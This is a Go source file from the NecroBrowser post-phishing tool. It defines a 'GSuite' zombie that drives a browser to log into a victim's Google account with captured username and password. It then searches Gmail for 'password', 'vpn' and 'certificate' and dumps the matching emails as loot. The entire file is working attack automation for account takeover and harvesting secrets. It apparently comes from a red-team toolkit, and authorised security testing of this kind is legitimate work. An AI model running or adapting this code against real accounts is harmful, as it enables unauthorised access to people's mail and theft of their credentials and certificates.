package gsuite

import (
	"context"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/action/login"
	//"github.com/muraenateam/necrobrowser/action/screenshot"
	"github.com/muraenateam/necrobrowser/log"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "GSuite"
)

type GSuite struct {
	zombie.Target

	MyAccount         string
	GMailUrl          string
	GDriveUrl         string
	GMailSearch       string
	SearchForKeywords []string
}

type Extrusion struct {
	zombie.Extrusion
}

func NewGSuite(target zombie.Target) *GSuite {

	target.Tag = zombie.GetTag(Name)
	return &GSuite{
		Target:            target,
		MyAccount:         "https://myaccount.google.com/personal-info",
		GMailUrl:          "https://mail.google.com/mail/#inbox",
		GDriveUrl:         "https://drive.google.com/drive/my-drive",
		GMailSearch:       "https://mail.google.com/mail/u/0/#search/",
		SearchForKeywords: []string{"password", "vpn", "certificate"},
	}
}

// Name returns the action name
func (z *GSuite) Name() string {
	return Name
}

// SetLootPath updates the zombie target object
func (z *GSuite) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *GSuite) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *GSuite) Instrument() (interface{}, error) {
	var err error

	a := action.Action{Target: z.Target}
	z.Info("Instrumenting Google accounts")

	loginAutomation := &login.Login{
		Action:           a,
		URL:              "https://accounts.google.com/ServiceLogin",
		Username:         z.Target.Username,
		UsernameSelector: `#gaia_firstform > div > div > div > div > input`,
		//UsernameSelector: `#identifierId`, - GUI MODE
		Password:         z.Target.Password,
		PasswordSelector: `#password > div > div > div > input`,
	}
	if err = loginAutomation.Do(); err != nil {
		log.Error("Error performing login: %v", err)
		return nil, err
	}

	// Set session Cookies
	//c := &cookie.Cookie{Action: a}
	//if err = c.SetSessionCookies(); err != nil {
	//	log.Error("Error setting session cookies: %v", err)
	//	return nil, err
	//}

	z.Debug("Extracting gmail data information")

	// Take Screenshot
	//s := &screenshot.Screenshot{
	//	Action: a,
	//	URL:    z.GMailUrl,
	//	// No selector, take full page
	//}
	//s.Target = z.Target
	//if err = s.Take(); err != nil {
	//	log.Error("Error taking Screenshot: %s", err)
	//}

	// search for defined keywords
	for _, keyword := range z.SearchForKeywords {

		emails := z.dumpEmailByKeyword(keyword)
		if emails != "" {
			log.Info("[%s] eMails \n %s", tui.Bold(tui.Green(keyword)), emails)
		}
	}

	//z.Debug("Instrumenting GDrive")
	//s = &screenshot.Screenshot{
	//	Action: a,
	//	URL:    z.GDriveUrl,
	//	// No selector, take full page
	//}
	//s.Target = z.Target
	//if err = s.Take(); err != nil {
	//	log.Error("Error taking screenshot: %v", err)
	//}

	return "", nil
}
